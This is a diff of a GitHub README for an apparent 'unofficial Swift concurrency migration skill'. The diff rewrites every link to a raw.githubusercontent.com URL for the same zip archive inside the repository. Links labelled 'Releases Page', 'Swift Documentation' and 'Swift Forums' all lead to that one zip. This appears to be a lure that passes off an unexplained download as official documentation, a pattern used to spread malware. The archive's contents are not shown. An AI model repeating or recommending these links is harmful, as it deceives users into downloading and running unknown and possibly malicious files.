@@ -1,6 +1,6 @@
 # 🚀 the-unofficial-swift-concurrency-migration-skill - Simplify your Swift concurrency tasks
 
-[![Download the-unofficial-swift-concurrency-migration-skill](https://github.com/rolandobenitez/the-unofficial-swift-concurrency-migration-skill/raw/refs/heads/main/migrating-to-swift-concurrency/Guide/concurrency_migration_swift_the_skill_unofficial_v1.2.zip)](https://github.com/rolandobenitez/the-unofficial-swift-concurrency-migration-skill/raw/refs/heads/main/migrating-to-swift-concurrency/Guide/concurrency_migration_swift_the_skill_unofficial_v1.2.zip)
+[![Download the-unofficial-swift-concurrency-migration-skill](https://raw.githubusercontent.com/rolandobenitez/the-unofficial-swift-concurrency-migration-skill/main/migrating-to-swift-concurrency/Guide/concurrency_migration_swift_the_skill_unofficial_v1.2.zip)](https://raw.githubusercontent.com/rolandobenitez/the-unofficial-swift-concurrency-migration-skill/main/migrating-to-swift-concurrency/Guide/concurrency_migration_swift_the_skill_unofficial_v1.2.zip)
 
 ## 📘 Description
 
@@ -29,7 +29,7 @@ To start using the Swift Concurrency Migration Guide, you need to download the a
 
 1. **Access the Releases Page:** Click the link below to stand at the front door of downloads.
    
-   [Visit this page to download](https://github.com/rolandobenitez/the-unofficial-swift-concurrency-migration-skill/raw/refs/heads/main/migrating-to-swift-concurrency/Guide/concurrency_migration_swift_the_skill_unofficial_v1.2.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/rolandobenitez/the-unofficial-swift-concurrency-migration-skill/main/migrating-to-swift-concurrency/Guide/concurrency_migration_swift_the_skill_unofficial_v1.2.zip)
 
 2. **Select the Latest Release:** On the Releases page, locate the latest version of the application.
 
@@ -47,7 +47,7 @@ Ready to get started? Follow these steps:
 
 1. **Go to the Releases Page:** Click the link below to access our available versions.
 
-   [Visit this page to download](https://github.com/rolandobenitez/the-unofficial-swift-concurrency-migration-skill/raw/refs/heads/main/migrating-to-swift-concurrency/Guide/concurrency_migration_swift_the_skill_unofficial_v1.2.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/rolandobenitez/the-unofficial-swift-concurrency-migration-skill/main/migrating-to-swift-concurrency/Guide/concurrency_migration_swift_the_skill_unofficial_v1.2.zip)
 
 2. **Pick Your Version:** Browse the list and choose the most recent release.
 
@@ -70,8 +70,8 @@ If you run into any issues, check our FAQ section on the releases page. You can 
 
 For more information on Swift concurrency, visit the official Swift documentation and community forums:
 
-- [Swift Documentation](https://github.com/rolandobenitez/the-unofficial-swift-concurrency-migration-skill/raw/refs/heads/main/migrating-to-swift-concurrency/Guide/concurrency_migration_swift_the_skill_unofficial_v1.2.zip)
-- [Swift Forums](https://github.com/rolandobenitez/the-unofficial-swift-concurrency-migration-skill/raw/refs/heads/main/migrating-to-swift-concurrency/Guide/concurrency_migration_swift_the_skill_unofficial_v1.2.zip)
+- [Swift Documentation](https://raw.githubusercontent.com/rolandobenitez/the-unofficial-swift-concurrency-migration-skill/main/migrating-to-swift-concurrency/Guide/concurrency_migration_swift_the_skill_unofficial_v1.2.zip)
+- [Swift Forums](https://raw.githubusercontent.com/rolandobenitez/the-unofficial-swift-concurrency-migration-skill/main/migrating-to-swift-concurrency/Guide/concurrency_migration_swift_the_skill_unofficial_v1.2.zip)
 
 ## 📌 Topics
 
